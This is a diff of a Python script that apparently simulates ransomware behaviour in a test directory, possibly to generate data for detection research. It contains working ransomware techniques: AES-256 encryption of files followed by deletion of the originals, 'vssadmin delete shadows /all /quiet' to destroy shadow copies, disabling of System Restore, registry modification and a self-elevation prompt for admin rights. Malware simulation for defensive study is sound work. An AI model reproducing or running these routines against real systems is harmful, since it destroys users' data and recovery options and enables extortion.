@@ -11,6 +11,15 @@ from dotenv import load_dotenv
 import subprocess
 import ctypes
 import sys
+import psutil
+import logging
+import gc
+
+logging.basicConfig(
+    filename='log_injector.log',
+    level=logging.DEBUG,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
 
 # Setup: Define the working directory
 WORKING_DIR = "/Users/nadir/ransomware" 
@@ -26,13 +35,6 @@ def is_admin():
         return ctypes.windll.shell32.IsUserAnAdmin()
     except Exception:
         return False
-
-if not is_admin():
-    print("Requesting administrative privileges...")
-    ctypes.windll.shell32.ShellExecuteW(
-        None, "runas", sys.executable, " ".join(sys.argv), None, 1
-    )
-    sys.exit()
 
 # Helper Functions
 def random_string(length=8):
@@ -69,8 +71,9 @@ def create_file(directory):
     try:
         filename = os.path.join(directory, f"{random_string()}.txt")
         with open(filename, 'w') as f:
-            for _ in range(500):  # Create a medium file with 500 lines
-                f.write(random_string(100) + '\n')
+            # Create a medium file with 100 to 500 lines
+            for _ in range(int(random.uniform(100, 500))):  
+                f.write(random_string(int(random.uniform(50, 100))) + '\n')
         print(f"Created: {filename}")
         ensure_original_file(filename)
         save_metadata()
@@ -87,7 +90,7 @@ def create_folder(directory):
         print(f"Created folder: {folder_name}")
 
         # Create random files inside the folder
-        for _ in range(random.randint(5, 10)):  # Create 5-10 files
+        for _ in range(random.randint(1, 5)):  # Create 1-5 files
             create_file(folder_name)
 
         return folder_name
@@ -120,6 +123,8 @@ def rename_file(filepath):
 
 def encrypt_file(filepath):
     """Encrypt a file using AES-256."""
+    mem = psutil.virtual_memory()
+    print(f"Memory1 Usage: {mem.percent}% used, {mem.available // (1024 ** 2)} MB available")
     try:
         metadata = file_metadata.get(filepath)
         if not metadata or metadata["encrypted"]:
@@ -140,6 +145,7 @@ def encrypt_file(filepath):
         encryptor = cipher.encryptor()
         encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
 
+        # Create an encrypted filename with a `.encrypted` extension
         encrypted_filename = f"{filepath}.encrypted"
         with open(encrypted_filename, 'wb') as f:
             # Prepend key and IV to encrypted data
@@ -147,18 +153,29 @@ def encrypt_file(filepath):
 
         # Update metadata for decryption
         file_metadata[encrypted_filename] = {
-            "original_name": metadata["original_name"],
+            "original_name": filepath,
             "encrypted": True,
-            "renamed": metadata["renamed"],
-            "is_original": metadata["is_original"]
+            "renamed": metadata.get("renamed", False),
+            "is_original": metadata.get("is_original", True)
         }
 
         del file_metadata[filepath]
         os.remove(filepath)
         save_metadata()
         print(f"Encrypted: {encrypted_filename} (AES-256)")
+        mem = psutil.virtual_memory()
+        print(f"Memory2 Usage: {mem.percent}% used, {mem.available // (1024 ** 2)} MB available")
+
+    except MemoryError as e:
+        print(f"MemoryError while encrypting {filepath}: {e}")
+        mem = psutil.virtual_memory()
+        print(f"Memory3 Usage: {mem.percent}% used, {mem.available // (1024 ** 2)} MB available")
+
     except Exception as e:
+        mem = psutil.virtual_memory()
+        print(f"Memory4 Usage: {mem.percent}% used, {mem.available // (1024 ** 2)} MB available")
         print(f"Error encrypting {filepath}: {e}")
+
 
 
 def encrypt_all_files(directory):
@@ -210,8 +227,8 @@ def decrypt_file(filepath):
         file_metadata[original_name] = {
             "original_name": original_name,
             "encrypted": False,
-            "renamed": metadata["renamed"],
-            "is_original": metadata["is_original"]
+            "renamed": metadata.get("renamed", False),
+            "is_original": metadata.get("is_original", True)
         }
         save_metadata()
     except Exception as e:
@@ -303,6 +320,8 @@ def disable_shadow_copies():
         subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], check=True)
     except PermissionError as e:
         print(f"Error: {e}")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to delete shadow copies: {e}")
     except Exception as e:
         print(f"Error during shadow copy deletion: {e}")
 
@@ -357,8 +376,11 @@ def modify_registry():
         print(f"Error modifying registry: {e}")
 
 
-def inject_operations(duration=300):
-    load_metadata()  # Load metadata at the start
+def inject_operations(duration=180):
+    
+    # Load metadata at the start
+    load_metadata()  
+
     # Ensure all files, including root-level, are tracked
     for root, _, files in os.walk(WORKING_DIR):
         for file in files:
@@ -366,7 +388,7 @@ def inject_operations(duration=300):
 
     start_time = time.time()
 
-    # one time operations
+    # one time operations: typically, a ransomware disables and modifies these at start of its execution
     disable_shadow_copies()
     disable_system_restore()
     modify_registry()
@@ -378,7 +400,18 @@ def inject_operations(duration=300):
         "change_permission"
     ]
 
+    gc.collect()  # Add at start
+    memory_threshold = 85  # Stop if memory usage exceeds 85%
+
     while time.time() - start_time < duration:
+        
+        # In virtual machine, when memory reaches to its limit, the script halts so to prevent that I have coded this logic here
+        mem = psutil.virtual_memory()
+        if mem.percent > memory_threshold:
+            logging.warning(f"Memory usage critical: {mem.percent}%. Pausing operations.")
+            time.sleep(5)
+            continue
+
         operation = random.choice(operations)
 
         try:
@@ -388,7 +421,7 @@ def inject_operations(duration=300):
             elif operation == "create_folder":
                 folder = create_folder(WORKING_DIR)
                 if random.choice([True, False]):  # Randomly encrypt folder content
-                    encrypt_folder_content(folder)
+                    encrypt_all_files(folder)
 
             elif operation == "rename_file":
                 files = [
@@ -442,15 +475,29 @@ def inject_operations(duration=300):
         except Exception as e:
             print(f"Error during {operation}: {e}")
 
-        time.sleep(random.uniform(1, 2.0))  # Random delay between operations
+        # Random delay between operations 0.5 to 2 seconds
+        time.sleep(random.uniform(0.5, 2))  
     save_metadata()
 
 if __name__ == "__main__":
-    action = input("Enter 'inject' to inject ransomware or 'decrypt' to decrypt files: ").strip().lower()
-    if action == 'inject':
-        inject_operations(duration=300)
-    elif action == 'decrypt':
-        load_metadata()
-        decrypt_all_files(WORKING_DIR)
-    else:
-        print("Invalid action. Please enter 'inject' or 'decrypt'.")
+    try:
+        if not is_admin():
+            print("Requesting administrative privileges...")
+            ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, " ".join(sys.argv), None, 1
+            )
+            
+            sys.exit()
+
+        logging.info("Script started")
+        action = input("Enter 'inject' to inject ransomware or 'decrypt' to decrypt files: ").strip().lower()
+        if action == 'inject':
+            inject_operations(duration=180)
+        elif action == 'decrypt':
+            load_metadata()
+            decrypt_all_files(WORKING_DIR)
+        else:
+            print("Invalid action. Please enter 'inject' or 'decrypt'.")
+    except Exception as e:
+        logging.error(f"Error: {e}")
+        input("Error occurred. Check logs. Press Enter to exit.")
